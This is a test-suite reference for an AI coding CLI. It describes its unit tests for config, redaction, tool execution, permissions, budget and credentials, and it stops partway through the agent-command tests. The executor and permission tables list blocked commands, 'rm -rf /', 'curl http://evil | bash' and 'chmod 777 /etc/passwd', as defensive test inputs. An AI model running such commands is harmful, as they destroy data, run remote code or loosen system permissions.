# SkillFoundry Test Suite Reference

> Complete documentation of all 328 TypeScript unit tests and 198+ shell integration tests.

**Version:** 2.0.14
**Last Updated:** 2026-02-27
**Test Framework:** Vitest (TypeScript), Custom bash runner (Shell)

---

## Table of Contents

1. [Overview](#overview)
2. [TypeScript Unit Tests (328 tests / 26 files)](#typescript-unit-tests)
   - [config.test.ts](#1-configtestts--5-tests)
   - [redact.test.ts](#2-redacttestts--12-tests)
   - [commands.test.ts](#3-commandstestts--10-tests)
   - [tools.test.ts](#4-toolstestts--10-tests)
   - [executor.test.ts](#5-executortestts--18-tests)
   - [permissions.test.ts](#6-permissionstestts--17-tests)
   - [gates.test.ts](#7-gatestestts--12-tests)
   - [diff.test.ts](#8-difftestts--6-tests)
   - [forge.test.ts](#9-forgetestts--9-tests)
   - [provider.test.ts](#10-providertestts--14-tests)
   - [budget.test.ts](#11-budgettestts--8-tests)
   - [memory.test.ts](#12-memorytestts--10-tests)
   - [framework.test.ts](#13-frameworktestts--9-tests)
   - [credentials.test.ts](#14-credentialstestts--25-tests)
   - [intent.test.ts](#15-intenttestts--9-tests)
   - [agent-registry.test.ts](#16-agent-registrytestts--24-tests)
   - [agent-command.test.ts](#17-agent-commandtestts--9-tests)
   - [team-router.test.ts](#18-team-routertestts--16-tests)
   - [team-command.test.ts](#19-team-commandtestts--11-tests)
   - [retry.test.ts](#20-retrytestts--6-tests)
   - [ai-runner.test.ts](#21-ai-runnertestts--8-tests)
   - [pipeline.test.ts](#22-pipelinetestts--16-tests)
   - [compaction.test.ts](#23-compactiontestts--20-tests)
   - [health-check.test.ts](#24-health-checktestts--13-tests)
   - [task-classifier.test.ts](#25-task-classifiertestts--15-tests)
   - [micro-gates.test.ts](#26-micro-gatestestts--16-tests)
3. [Shell Integration Tests (198+ tests / 8 files)](#shell-integration-tests)
   - [run-tests.sh](#1-run-testssh--167-tests)
   - [test_sf_cli.sh](#2-test_sf_clish--21-tests)
   - [test_wave_a_framework.sh](#3-test_wave_a_frameworksh--5-tests)
   - [test_wave_b_framework.sh](#4-test_wave_b_frameworksh--3-tests)
   - [test_wave_c_framework.sh](#5-test_wave_c_frameworksh--3-tests)
   - [test_wave_d_framework.sh](#6-test_wave_d_frameworksh--4-tests)
   - [test_wave_e_framework.sh](#7-test_wave_e_frameworksh--7-tests)
   - [test-agent-evolution.sh](#8-test-agent-evolutionsh--5-tests)
4. [Test Architecture](#test-architecture)
5. [Running Tests](#running-tests)
6. [Coverage Map](#coverage-map)

---

## Overview

The SkillFoundry test suite validates the entire stack from low-level utility functions through AI orchestration pipelines:

| Layer | Tests | Files | Framework |
|-------|-------|-------|-----------|
| TypeScript Unit Tests | 328 | 26 | Vitest |
| Shell Integration Tests | 198+ | 8 | Custom bash runner |
| **Total** | **506+** | **33** | — |

### What the tests protect

- **Core engine**: Config, providers, tools, permissions, budget, credentials
- **AI pipeline**: Agent loop, retry/fallback, streaming, pipeline orchestration
- **Quality gates**: The Anvil (T1-T6), forge pipeline, layer checks
- **Intelligence**: Intent classification, task routing, team routing, agent registry
- **Safety**: Secret redaction, permission enforcement, dangerous command blocking
- **Local-first**: Context compaction, health checks, provider resolution, task classification

---

## TypeScript Unit Tests

All TypeScript tests live in `sf_cli/src/__tests__/` and use **Vitest** with `vi.mock()` for dependency isolation.

---

### 1. config.test.ts — 5 tests

**Source:** `sf_cli/src/core/config.ts`
**What it protects:** TOML configuration loading, default generation, workspace bootstrapping

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Loads defaults when no file exists | Calls `loadConfig()` on empty temp dir | Returns `SfConfig` with `provider: 'anthropic'`, `engine: 'one-shot'`, `model: 'claude-sonnet-4-20250514'` | Ensures the CLI works out-of-the-box without any configuration file — new users get sensible defaults |
| 2 | Loads existing TOML config | Writes a `.skillfoundry/config.toml` with `provider = "openai"`, then loads | Merges TOML values over defaults; `provider` is `'openai'`, other fields retain defaults | Validates that user customization actually takes effect when persisted |
| 3 | Creates workspace directories | Calls `loadConfig()` and checks filesystem | `.skillfoundry/` directory exists after load | Guarantees the config directory is auto-created — prevents "directory not found" crashes on first run |
| 4 | `createDefaultFiles` writes config.toml and policy.toml | Calls `createDefaultFiles()`, reads both files | Both files exist and contain expected TOML keys (`provider`, `engine` in config; `allow_shell`, `allow_write` in policy) | Ensures `sf init` produces a valid project scaffold that won't fail on next load |
| 5 | Idempotent config creation | Calls `createDefaultFiles()` twice on same dir | No errors, files still valid after second call | Prevents double-init from corrupting configuration — safe to re-run setup |

**Setup/Teardown:** Each test creates a fresh temp directory via `mkdtempSync` and passes it as `workDir`.

---

### 2. redact.test.ts — 12 tests

**Source:** `sf_cli/src/core/redact.ts`
**What it protects:** Secret masking in AI conversations to prevent credential leakage

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Redacts OpenAI API keys | Passes `sk-abc123...` through `redactText()` | Returns `[REDACTED:OPENAI_KEY]` | Prevents OpenAI keys from leaking into AI context or logs |
| 2 | Redacts xAI API keys | Passes `xai-abc123...` | `[REDACTED:XAI_KEY]` | Same protection for xAI/Grok credentials |
| 3 | Redacts Anthropic keys | Passes `sk-ant-api...` | `[REDACTED:ANTHROPIC_KEY]` | Protects Anthropic API keys (longer prefix than OpenAI) |
| 4 | Redacts GitHub tokens | Passes `ghp_abc123...` | `[REDACTED:GITHUB_TOKEN]` | Prevents GitHub PATs from exposure |
| 5 | Redacts AWS access keys | Passes `AKIA...` (20-char uppercase) | `[REDACTED:AWS_KEY]` | Catches AWS IAM access key IDs |
| 6 | Redacts Bearer tokens | Passes `Authorization: Bearer eyJ...` | `[REDACTED:BEARER_TOKEN]` | Stops auth headers from leaking into AI context |
| 7 | Redacts JWTs | Passes `eyJhbG...eyJzdW...signature` (3-part dot-separated) | `[REDACTED:JWT]` | Catches standalone JWT tokens in code or output |
| 8 | Redacts MongoDB URIs | Passes `mongodb+srv://user:pass@host` | `[REDACTED:MONGODB_URI]` | Prevents database credentials in connection strings from leaking |
| 9 | Redacts PostgreSQL URIs | Passes `postgresql://user:pass@host` | `[REDACTED:PG_URI]` | Same protection for PostgreSQL connection strings |
| 10 | Passthrough when disabled | Calls `redactText(text, false)` | Returns text unchanged | Allows disabling redaction for debugging without code changes |
| 11 | Normal text untouched | Passes `"Hello world"` | Returns `"Hello world"` as-is | Ensures redaction doesn't mangle normal conversation text |
| 12 | Multiple keys in one string | Passes string with both OpenAI key and GitHub token | Both replaced with their respective `[REDACTED:...]` tags | Handles real-world scenarios where multiple secrets appear together |

**Value:** This is a **critical security layer** — without it, users' API keys could be sent to AI providers as part of the conversation context, creating a credential exfiltration vector.

---

### 3. commands.test.ts — 10 tests

**Source:** `sf_cli/src/core/commands.ts`
**What it protects:** Slash command parsing and registry — the `/command` interface users type

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Parses `/help` | `parseSlashCommand('/help')` | `{ name: 'help', args: '' }` | Basic command parsing works |
| 2 | Parses `/status` | `parseSlashCommand('/status')` | `{ name: 'status', args: '' }` | No-args commands parse correctly |
| 3 | Parses `/plan add dark mode` | `parseSlashCommand('/plan add dark mode')` | `{ name: 'plan', args: 'add dark mode' }` | Arguments after command name are captured as a string |
| 4 | Returns null for non-slash | `parseSlashCommand('hello world')` | `null` | Normal chat messages don't accidentally trigger commands |
| 5 | Trims whitespace | `parseSlashCommand('  /help  ')` | `{ name: 'help', args: '' }` | Sloppy typing doesn't break the parser |
| 6 | Registry has `help` | `getCommand('help')` | Returns the help command object | Core command is registered and discoverable |
| 7 | Registry has `status` | `getCommand('status')` | Returns the status command object | Session status command available |
| 8 | Unknown returns undefined | `getCommand('nonexistent')` | `undefined` | Graceful handling of invalid commands |
| 9 | Lists all commands | `getAllCommands()` | Array with length > 0, all entries have `name` and `description` | Ensures `/help` can display a complete command list |
| 10 | All commands have description | Iterates `getAllCommands()` | Every command has non-empty `description` | Prevents undocumented commands from shipping |

**Value:** Guards the primary user interaction layer — if command parsing breaks, the CLI is unusable.

---

### 4. tools.test.ts — 10 tests

**Source:** `sf_cli/src/core/tools.ts`
**What it protects:** Tool definitions sent to AI providers (the "function calling" schema)

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Defines exactly 5 tools | `ALL_TOOLS.length` | `5` | No tools accidentally added or removed |
| 2 | All names unique | Checks for duplicates in name array | No duplicates | Prevents AI from receiving ambiguous tool names |
| 3 | All have required fields | Each tool has `name`, `description`, `input_schema` | All fields present and truthy | Invalid tool schemas would cause provider API errors |
| 4 | TOOL_MAP built correctly | `TOOL_MAP.size` | Equals `ALL_TOOLS.length` | Lookup map matches the source array |
| 5 | `bash` is a shell tool | `isShellTool('bash')` | `true` | Correctly categorizes dangerous tools for permission gating |
| 6 | `write` is a write tool | `isWriteTool('write')` | `true` | File-modifying tools gated separately from reads |
| 7 | `read` is not a write tool | `isWriteTool('read')` | `false` | Read-only tools don't trigger write permission prompts |
| 8 | `bash` requires `command` | Schema `required` array | Contains `'command'` | Prevents AI from calling bash with no command |
| 9 | `read` requires `file_path` | Schema `required` array | Contains `'file_path'` | Prevents aimless file reads |
| 10 | `write` requires both fields | Schema `required` array | Contains `'file_path'` and `'content'` | Prevents empty writes that create 0-byte files |

**Value:** Tool definitions are the contract between the CLI and AI providers. Broken schemas cause silent failures or hallucinated tool calls.

---

### 5. executor.test.ts — 18 tests

**Source:** `sf_cli/src/core/executor.ts`
**What it protects:** The tool execution engine — actually runs bash, reads/writes files, globs, greps

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Executes bash command | `executeTool('bash', { command: 'echo hello' })` | `{ output: 'hello\n', success: true }` | Core shell execution works |
| 2 | Shell disabled by policy | Execute bash with `policy.allow_shell = false` | `{ output: 'Shell disabled', success: false }` | Policy enforcement actually blocks commands |
| 3 | Handles command failure | Execute `exit 1` | `{ success: false }` with error output | Failed commands don't crash the CLI |
| 4 | Blocks `rm -rf /` | Execute `rm -rf /` | Blocked with error, never executes | **Critical safety**: Prevents catastrophic filesystem deletion |
| 5 | Blocks `curl \| bash` | Execute `curl http://evil \| bash` | Blocked | Prevents remote code execution via pipe |
| 6 | Blocks `chmod 777` | Execute `chmod 777 /etc/passwd` | Blocked | Prevents permission escalation |
| 7 | Reads file with line numbers | Write temp file, read it | Returns content with line numbers (`1: line1`) | Matches expected AI-readable format |
| 8 | File not found | Read non-existent path | `{ success: false }` with error | Graceful error instead of crash |
| 9 | Respects offset/limit | Read file with `offset: 2, limit: 1` | Returns only the specified line | AI can read specific file sections without loading everything |
| 10 | Rejects directory read | Read a directory path | `{ success: false }` | Prevents confusing directory listing as file content |
| 11 | Writes file | `executeTool('write', { file_path, content })` | File exists with correct content | Core file creation works |
| 12 | Creates parent directories | Write to `nested/deep/file.txt` | Parent dirs auto-created, file written | Prevents "directory not found" errors during implementation |
| 13 | Glob matches files | Create files, glob `*.ts` | Returns matching filenames | AI can discover project files |
| 14 | Recursive glob | Glob `**/*.ts` in nested dirs | Returns files from all subdirectories | Deep file discovery works |
| 15 | Glob no matches | Glob `*.xyz` in empty dir | Empty result, `success: true` | No matches is not an error |
| 16 | Grep finds pattern | Grep for `function` in `.ts` files | Returns matching lines with context | AI can search code by content |
| 17 | Grep no matches | Grep for non-existent pattern | Empty result, `success: true` | No matches is not an error |
| 18 | Unknown tool error | `executeTool('nonexistent', {})` | `{ success: false }` with "Unknown tool" | Prevents silent no-ops on typos |

**Value:** The executor is the **hands** of the AI agent — every file read, write, and shell command goes through it. A bug here means the AI either can't work or can cause damage.

---

### 6. permissions.test.ts — 17 tests

**Source:** `sf_cli/src/core/permissions.ts`
**What it protects:** The permission model — what the AI is allowed to do and when it must ask

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Trusted mode allows all | `checkPermission('bash', ..., 'trusted')` | `'allow'` | Autonomous operation for trusted environments |
| 2 | Deny mode denies all | `checkPermission('bash', ..., 'deny')` | `'deny'` | Complete lockdown mode |
| 3 | Bash denied when shell disabled | Policy `allow_shell: false` | `'deny'` | Policy overrides mode |
| 4 | Auto-approves read | `checkPermission('read', ..., 'auto')` | `'allow'` | Read operations are safe, don't prompt |
| 5 | Auto-approves glob | `checkPermission('glob', ..., 'auto')` | `'allow'` | File discovery is safe |
| 6 | Asks for write in auto | `checkPermission('write', ..., 'auto')` | `'ask'` | File modifications need user consent |
| 7 | Asks for bash in auto | `checkPermission('bash', ..., 'auto')` | `'ask'` | Shell commands need user consent |
| 8 | Ask mode asks everything | `checkPermission('read', ..., 'ask')` | `'ask'` | Maximum caution mode |
| 9 | Blocks `rm -rf` always | Even in trusted mode | `'deny'` | **Dangerous commands blocked regardless of mode** |
| 10 | Blocks `curl\|bash` always | Even in trusted mode | `'deny'` | Remote code execution always blocked |
| 11 | `git push` is sensitive | In auto mode | `'ask'` | Pushing code affects shared state, needs confirmation |
| 12 | `allowAlways` specific call | Grant permission for specific tool+args, recheck | `'allow'` on second check | "Yes, always for this" button works |
| 13 | `allowToolAlways` for tool type | Grant bash globally, check different command | `'allow'` for any bash | "Yes, always for bash" button works |
| 14 | Dangerous still blocked after allowTool | Grant bash globally, try `rm -rf` | `'deny'` | Allow-all cannot override safety blocklist |
| 15 | Format bash summary | `formatToolCallSummary('bash', { command: 'ls' })` | `'bash: ls'` | User sees what command the AI wants to run |
| 16 | Format read summary | `formatToolCallSummary('read', { file_path: '/tmp/x' })` | `'read: /tmp/x'` | User sees which file the AI wants to read |
| 17 | Format grep summary | `formatToolCallSummary('grep', { pattern: 'TODO' })` | `'grep: TODO'` | User sees what pattern the AI is searching |

**Value:** This is the **trust boundary** between the AI and the user's system. Without it, the AI could delete files, run arbitrary commands, or push code without consent.

---

### 7. gates.test.ts — 12 tests

**Source:** `sf_cli/src/core/gates.ts`
**What it protects:** The Anvil quality gate system (T1-T6 tiers)

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | T1 passes clean files | Run T1 on dir with no banned patterns | `{ passed: true }` | Clean code passes the gate |
| 2 | T1 detects banned patterns | Create file with `TODO` and `FIXME` | `{ passed: false, findings: [...] }` | Catches placeholder code before it ships |
| 3 | T2 skips when no tsconfig | Run T2 in dir without TypeScript | `{ passed: true, skipped: true }` | Gates adapt to project type — no false failures |
| 4 | T3 skips when no test runner | Run T3 in dir without vitest/jest | `{ passed: true, skipped: true }` | Same adaptive behavior for tests |
| 5 | T4 skips when no scanner | Run T4 without security tools | `{ passed: true, skipped: true }` | Security gate doesn't block non-security projects |
| 6 | T5 skips when no build | Run T5 without build script | `{ passed: true, skipped: true }` | Build gate skips for non-compiled projects |
| 7 | T6 always passes (scope) | Run T6 | `{ passed: true }` | Scope verification is advisory, not blocking |
| 8 | Unknown tier handled | Run tier `'T99'` | `{ passed: true }` with warning | Future tiers don't crash the system |
| 9 | `runAllGates` runs 6 tiers | Run all gates, count results | 6 results (T1-T6) | Full Anvil pipeline executes completely |
| 10 | Pass verdict for clean project | Run all on clean dir | `verdict: 'PASS'` | Clean projects get green light |
| 11 | Callbacks fire | Run with `onGateStart`/`onGateComplete` | Both called for each tier | UI can show real-time gate progress |
| 12 | Duration tracked | Run all gates, check `totalDurationMs` | Number > 0 | Performance monitoring of gate execution |

**Value:** The Anvil gates enforce the "zero tolerance" policy from CLAUDE.md — no TODOs, no placeholders, no broken builds ship to production.

---

### 8. diff.test.ts — 6 tests

**Source:** `sf_cli/src/core/diff.ts`
**What it protects:** Unified diff parsing for code review and change display

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Parses multiple files | Feed multi-file diff string | Array with entries per file | Multi-file PRs parsed correctly |
| 2 | Identifies additions | Diff with `+` lines | `additions` array populated | Green lines in diff display |
| 3 | Identifies removals | Diff with `-` lines | `removals` array populated | Red lines in diff display |
| 4 | Tracks context lines | Diff with unchanged lines | `context` array populated | Surrounding code for readability |
| 5 | Handles empty diff | Empty string | Empty array | No crash on "no changes" |
| 6 | Correct content extraction | Specific diff | `additions[0].content === 'new line'` | Content matches exactly (no off-by-one) |

**Value:** Diff rendering is how users review AI-proposed changes before approving them. Incorrect parsing means users approve the wrong changes.

---

### 9. forge.test.ts — 9 tests

**Source:** `sf_cli/src/commands/forge.ts`
**What it protects:** The Forge pipeline slash command parsing and PRD/story scanning

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Parses `/plan` | `parseSlashCommand('/plan ...')` | Correct command object | Plan command recognized |
| 2 | Parses `/apply` | `parseSlashCommand('/apply ...')` | Correct command object | Apply command recognized |
| 3 | Parses `/gates` | `parseSlashCommand('/gates')` | Correct command object | Gate check command recognized |
| 4 | Parses `/forge` | `parseSlashCommand('/forge')` | Correct command object | Forge pipeline command recognized |
| 5 | Scans PRDs from genesis/ | Create temp genesis/ with PRD files | Finds all `.md` files | Pipeline discovers work items |
| 6 | Excludes TEMPLATE.md | Create genesis/ with TEMPLATE.md + real PRDs | TEMPLATE.md not in results | Template file doesn't become a story |
| 7 | Scans stories from docs/ | Create story files in `docs/stories/prd-name/` | Finds all STORY-*.md files | Pipeline discovers implementation tasks |
| 8 | Empty genesis/ | Scan empty directory | Empty array | Graceful handling of no work |
| 9 | Story count correct | Multiple stories across PRDs | Count matches created files | Accurate progress tracking |

**Value:** The Forge pipeline starts by scanning for PRDs and stories. If scanning is broken, the entire pipeline fails or processes wrong files.

---

### 10. provider.test.ts — 14 tests

**Source:** `sf_cli/src/core/provider.ts`
**What it protects:** AI provider registry, detection, and instantiation

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | 6 providers defined | `Object.keys(AVAILABLE_PROVIDERS).length` | `6` | All supported providers registered |
| 2 | Includes anthropic | `AVAILABLE_PROVIDERS.anthropic` | Exists | Default provider available |
| 3 | Includes openai | `AVAILABLE_PROVIDERS.openai` | Exists | OpenAI support registered |
| 4 | Includes xai | `AVAILABLE_PROVIDERS.xai` | Exists | xAI/Grok support registered |
| 5 | Includes gemini | `AVAILABLE_PROVIDERS.gemini` | Exists | Google Gemini support registered |
| 6 | Includes ollama | `AVAILABLE_PROVIDERS.ollama` | Exists | Local Ollama support registered |
| 7 | Includes lmstudio | `AVAILABLE_PROVIDERS.lmstudio` | Exists | Local LM Studio support registered |
| 8 | All have envKey + defaultModel | Iterate all providers | Each has truthy `envKey`, `defaultModel`, `name` | Provider metadata complete for setup wizard |
| 9 | Ollama always detected | `detectAvailableProviders()` | Contains `'ollama'` | Local providers don't need API keys |
| 10 | LM Studio always detected | `detectAvailableProviders()` | Contains `'lmstudio'` | Same — local providers always available |
| 11 | Creates anthropic provider | `createProvider('anthropic')` | `provider.name === 'anthropic'` | Provider instantiation works |
| 12 | Creates all 6 providers | `createProvider(name)` for each | All return valid objects | Every provider can be constructed |
| 13 | Throws for unknown | `createProvider('nonexistent')` | Throws "not supported" | Clear error for invalid provider names |
| 14 | Throws when API key missing | Delete `OPENAI_API_KEY`, create openai | Throws "API key required" | Catches missing credentials early |

**Setup:** `beforeEach` saves env vars and sets test keys; `afterEach` restores original env.

**Value:** Provider management is the foundation of multi-provider support. If a provider can't be created, the CLI can't talk to any AI.

---

### 11. budget.test.ts — 8 tests

**Source:** `sf_cli/src/core/budget.ts`
**What it protects:** Cost tracking, budget enforcement, and usage persistence

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Default usage when no file | `loadUsage()` on empty dir | Returns zeroed `UsageData` | First run doesn't crash |
| 2 | Records usage entry | `recordUsage()` with token counts and cost | Entry added to entries array | Individual API calls tracked |
| 3 | Monthly total accumulates | Record multiple entries, check `monthlyTotalUsd` | Sum of all costs | Cumulative spending visible |
| 4 | Persists across loads | Record, save, reload | Same data after reload | Budget survives CLI restarts |
| 5 | `checkBudget` allows under limit | Budget $10, spent $1 | `{ allowed: true }` | Normal usage proceeds |
| 6 | Monthly exceeded | Budget $10, spent $11 | `{ allowed: false, reason: 'monthly' }` | Hard stop when monthly limit hit |
| 7 | Run exceeded | Run budget $1, request cost estimate $2 | `{ allowed: false, reason: 'run' }` | Per-run budget prevents runaway single operations |
| 8 | Usage summary with breakdown | Record entries from different providers | Summary shows per-provider totals | Users see where their money goes |

**Value:** Without budget enforcement, an AI agent in a loop could rack up hundreds of dollars in API costs. This is the financial safety net.

---

### 12. memory.test.ts — 10 tests

**Source:** `sf_cli/src/core/memory.ts`
**What it protects:** Persistent knowledge base — lessons, decisions, and patterns across sessions

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Recall by content keywords | Store entries about "auth" and "payment", recall "auth" | Auth entry ranked higher | Keyword-based retrieval finds relevant memories |
| 2 | Recall by tag keywords | Store entry tagged `['security']`, recall "security" | Entry found via tag match | Tag metadata improves recall accuracy |
| 3 | Unrelated query returns few | Store "auth" entries, recall "weather" | 0 or very few results | Low noise in retrieval results |
| 4 | Empty knowledge base | Recall from empty dir | Empty array, no crash | Handles fresh projects gracefully |
| 5 | Recent entries first | Store old and new entries | Newer entries scored higher | Recent knowledge is more relevant |
| 6 | Capture and recall | `captureEntry()` then `recall()` | Newly captured entry found | Write→Read cycle works end-to-end |
| 7 | captureLesson type | `captureLesson()` | Entry has `type: 'lesson'` | Semantic typing for knowledge taxonomy |
| 8 | captureDecision type | `captureDecision()` | Entry has `type: 'decision'` | Decisions tracked separately from lessons |
| 9 | Stats with seeded data | Populate entries, call `getMemoryStats()` | Correct counts by type | Dashboard can display memory analytics |
| 10 | Stats empty | Stats on empty dir | All counts zero | No crash on empty state |

**Value:** Memory is what makes the AI agent **learn across sessions**. Without it, every session starts from zero — the same mistakes, the same questions, the same decisions.

---

### 13. framework.test.ts — 9 tests

**Source:** `sf_cli/src/core/framework.ts`
**What it protects:** Framework root detection, version resolution, and script discovery

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Root via env var | Set `SKILLFOUNDRY_ROOT` env | Returns that path | CI/CD and custom installs can set framework location |
| 2 | Invalid dir warns | Set root to non-existent path | Returns path but logs warning | Doesn't crash on bad env, just warns |
| 3 | Caches result | Call twice | Same object reference | Avoids repeated filesystem scans |
| 4 | Cache reset | Call, reset, call again | Fresh scan on second call | Test isolation and config changes work |
| 5 | Anvil script null | No script in expected path | Returns `null` | Missing optional scripts don't crash |
| 6 | Anvil script found | Create script at expected path | Returns script path | Script discovery for quality gates works |
| 7 | Version from .version file | Create `.version` with `2.0.13` | Returns `'2.0.13'` | Primary version source |
| 8 | Fallback to package.json | No `.version`, create `package.json` with version | Returns package.json version | Secondary version source |
| 9 | Fallback to 0.0.0 | No version files at all | Returns `'0.0.0'` | Always returns something — never throws |

**Value:** Framework discovery is how the CLI finds its own components (agents, scripts, gates). If this breaks, nothing else works.

---

### 14. credentials.test.ts — 25 tests

**Source:** `sf_cli/src/core/credentials.ts`
**What it protects:** Secure credential storage, loading, injection into environment

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Load empty credentials | No credentials file | Returns empty object `{}` | First run doesn't crash |
| 2 | Load valid TOML | Write TOML with `[openai]` section | Returns parsed object with `openai.api_key` | Credential file format works |
| 3 | Save creates directory | Save to non-existent path | Directory auto-created | No manual dir creation needed |
| 4 | Save writes valid TOML | Save credentials, read back | Valid TOML with expected content | Round-trip integrity |
| 5 | Save sets 0600 permissions | Save credentials, check `stat` | File mode `0o600` (owner read/write only) | **Security**: credentials readable only by owner |
| 6 | Set adds provider | `setCredential('openai', 'api_key', 'sk-xxx')` | Provider section added | Individual credential setting works |
| 7 | Set merges with existing | Set openai, then set xai | Both present | Multiple providers coexist |
| 8 | Remove deletes provider | Set then remove openai | OpenAI section gone | Credential cleanup works |
| 9 | Remove no-op for missing | Remove non-existent provider | No error | Safe to remove what doesn't exist |
| 10 | Inject sets env vars | Store openai key, call `injectCredentials()` | `process.env.OPENAI_API_KEY` set | Credentials flow from file to environment |
| 11 | Inject doesn't overwrite | Set env var, inject | Original value preserved | User-set env vars take precedence |
| 12 | Inject with missing file | Inject from non-existent path | No error, no env changes | Graceful on fresh installs |
| 13 | Inject auth_token | Store `auth_token` type credential | `process.env.PROVIDER_AUTH_TOKEN` set | Non-standard auth types work |
| 14 | getCredentialsPath | Call function | Returns `~/.skillfoundry/credentials.toml` | Standard credential location |
| 15 | hasAnyCredentials false | Empty state | Returns `false` | Accurate detection for setup wizard |
| 16 | hasAnyCredentials env | Set `OPENAI_API_KEY` env var | Returns `true` | Env vars count as configured |
| 17 | hasAnyCredentials stored | Store credentials in file | Returns `true` | File-based credentials count |
| 18 | PROVIDER_KEY_URLS complete | Check all 6 providers | Each has a non-empty URL | Setup wizard can show "get your key at..." links |
| 19 | Setup non-interactive errors | Missing provider arg | Returns error message | Bad CLI args handled |
| 20 | Setup saves credential | Run setup with valid args | Credential saved to file | `sf setup --provider openai --key sk-xxx` works |
| 21 | Setup auth_token type | Provider with `auth_token` | Saved as auth_token, not api_key | Per-provider credential types |
| 22 | Setup list shows providers | Run setup with `--list` | Lists configured providers | `sf setup --list` works |
| 23 | Setup remove | Run setup with `--remove openai` | OpenAI credentials deleted | `sf setup --remove openai` works |
| 24 | Setup missing key | Run setup without `--key` | Error message | Catches incomplete setup commands |
| 25 | Base_url credential type | LM Studio with `base_url` | Saved as base_url type | Local providers use URL, not API key |

**Value:** Credentials are the most security-sensitive part of the CLI. Broken credential handling means either the CLI can't authenticate, or worse, credentials are leaked or stored insecurely.

---

### 15. intent.test.ts — 9 tests

**Source:** `sf_cli/src/core/intent.ts`
**What it protects:** Message classification — determining if user input needs AI tools or is just chat

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Greetings as chat | `classifyIntent('hello')` | `'chat'` | "hello" doesn't trigger tool use |
| 2 | Questions as chat | `classifyIntent('what is TypeScript?')` | `'chat'` | Knowledge questions stay in chat mode |
| 3 | Short messages as chat | `classifyIntent('thanks')` | `'chat'` | Brief responses don't trigger tools |
| 4 | File operations as agent | `classifyIntent('read the config file')` | `'agent'` | File operations need tools |
| 5 | Build/run as agent | `classifyIntent('run the tests')` | `'agent'` | Execution tasks need bash tool |
| 6 | Code search as agent | `classifyIntent('find where auth is defined')` | `'agent'` | Search tasks need grep/glob tools |
| 7 | File paths as agent | `classifyIntent('look at src/index.ts')` | `'agent'` | Messages with paths imply file operations |
| 8 | Implementation as agent | `classifyIntent('add a login button')` | `'agent'` | Feature requests need full tool access |
| 9 | Short tool commands as agent | `classifyIntent('ls src/')` | `'agent'` | Even short messages can be tool commands |

**Value:** Correct intent classification prevents unnecessary tool invocations (saving tokens/cost) and ensures real tasks actually get tools.

---

### 16. agent-registry.test.ts — 24 tests

**Source:** `sf_cli/src/core/agent-registry.ts`
**What it protects:** The 60-agent registry — names, system prompts, tool access categories

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | 60 agents registered | `Object.keys(AGENT_REGISTRY).length` | `60` | All agents present after any refactor |
| 2 | Names sorted | Check alphabetical ordering | Sorted | Consistent display order |
| 3 | Valid toolCategory | Each agent's `toolCategory` | One of `FULL/CODE/REVIEW/OPS/INSPECT/NONE` | No typos in category assignment |
| 4 | System prompts under 150 words | Word count each prompt | All ≤ 150 | Prompts fit in context efficiently |
| 5 | Non-empty displayName | Each agent | Truthy `displayName` | UI always has something to show |
| 6 | Name matches key | Each `[key, agent]` pair | `agent.name === key` | No mismatch between registry key and agent identity |
| 7 | FULL tool set has 5 tools | `TOOL_SETS.FULL.length` | `5` | Full access = all 5 tools |
| 8 | CODE tool set has 4 tools | `TOOL_SETS.CODE.length` | `4` | Code agents: no bash |
| 9 | REVIEW tool set has 3 tools | `TOOL_SETS.REVIEW.length` | `3` | Review agents: read-only access |
| 10 | OPS tool set has 4 tools | `TOOL_SETS.OPS.length` | `4` | Ops agents: shell + read access |
| 11 | INSPECT tool set has 2 tools | `TOOL_SETS.INSPECT.length` | `2` | Inspect agents: minimal access |
| 12 | NONE tool set has 0 tools | `TOOL_SETS.NONE.length` | `0` | Chat-only agents: no tools |
| 13-18 | getAgentTools for each category | Call for FULL/CODE/REVIEW/OPS/INSPECT/NONE | Correct tool arrays | Tool access actually maps to definitions |
| 19 | Unknown agent fallback | `getAgentTools('nonexistent')` | Returns FULL set | Unknown agents get maximum capability |
| 20 | Known agent prompt | `getAgentSystemPrompt('coder')` | Non-empty string | System prompts load correctly |
| 21 | Unknown agent prompt | `getAgentSystemPrompt('nonexistent')` | Generic fallback prompt | Never sends empty system prompt |
| 22 | Get known agent | `getAgent('coder')` | Returns agent object | Direct agent lookup works |
| 23 | Get unknown agent | `getAgent('nonexistent')` | `undefined` | Graceful miss |
| 24 | Category counts sum to 60 | Sum agents per category | Total = 60 | Every agent has exactly one category |

**Value:** The agent registry is the brain of the multi-agent system. 60 agents with wrong tool access could either be powerless (can't do their job) or dangerous (too much access).

---

### 17. agent-command.test.ts — 9 tests

**Source:** `sf_cli/src/commands/agent.ts`
**What it protects:** The `/agent` slash command for activating/deactivating/inspecting agents

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | No args shows status | `/agent` with no active agent | "No agent active" message | Users know current state |
| 2 | Shows active agent | `/agent` when agent is set | Shows agent name and category | Current agent visible |
| 3 | Activate valid agent | `/agent coder` | Sets `session.activeAgent = 'coder'` | Users can switch agents |
| 4 | Reject unknown agent | `/agent nonexistent` | Error message listing valid agents | Typos caught with helpful output |
| 5 | Deactivate with off | `/agent off` | Clears `session.activeAgent` | Users can return to default mode |
| 6 | List grouped by category | `/agent list` | Agents grouped under FULL/CODE/etc headers | Users can browse available agents |
